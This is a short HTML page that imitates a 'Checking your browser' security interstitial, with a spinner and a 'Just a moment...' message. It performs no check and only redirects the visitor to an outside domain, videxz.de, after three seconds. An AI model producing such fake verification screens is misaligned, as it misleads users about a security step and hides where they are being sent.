<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checking your browser...</title>
  <style>
    body {
      margin: 0;
      background-color: #101010;
      color: #ddd;
      font-family: "Segoe UI", Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    h3 {
      font-weight: normal;
      font-size: 20px;
    }
    p {
      font-size: 14px;
      color: #aaa;
      margin-top: 6px;
    }
    .loader {
      border: 3px solid #222;
      border-top: 3px solid #00ffa3;
      border-radius: 50%;
      width: 38px;
      height: 38px;
      animation: spin 1s linear infinite;
      margin-top: 25px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h3>Checking your browser before accessing.</h3>
  <p>Just a moment...</p>
  <div class="loader"></div>

  <script>
    setTimeout(() => {
      window.location.href = "https://videxz.de";
    }, 3000);
  </script>
</body>
</html>
